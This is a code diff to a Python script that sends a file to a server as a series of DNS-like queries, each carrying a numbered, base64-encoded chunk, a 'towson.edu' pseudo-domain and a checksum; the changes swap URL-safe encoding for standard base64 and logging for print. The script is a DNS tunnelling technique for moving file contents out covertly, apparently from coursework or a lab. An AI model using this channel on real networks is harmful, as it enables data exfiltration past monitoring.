@@ -14,9 +14,6 @@ def generate_checksum(file_path):
 # Configure logging to display information, including the timestamp, log level, and the message
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
-def encode_base64(data):
-    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')
-
 def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60):
     """
     Send a file as a series of DNS-like queries to a specified server.
@@ -33,7 +30,7 @@ def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60)
 
     # Generate the checksum of the file
     checksum = generate_checksum(file_path)
-    logging.info(f"Checksum: {checksum}")
+    print(f"Checksum: {checksum}")
 
     # Open the file in binary read mode.
     with open(file_path, 'rb') as file:
@@ -52,7 +49,7 @@ def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60)
             packet_number_str = str(packet_number).zfill(4)
 
             # Base64-encode the chunk to ensure it's text-friendly
-            chunk_encoded = encode_base64(chunk)
+            chunk_encoded = base64.b64encode(chunk).decode('utf-8')
 
             # Append a pseudo domain to the chunk to simulate a DNS query.
             query = f"{packet_number_str}:{chunk_encoded}.towson.edu:{checksum}"
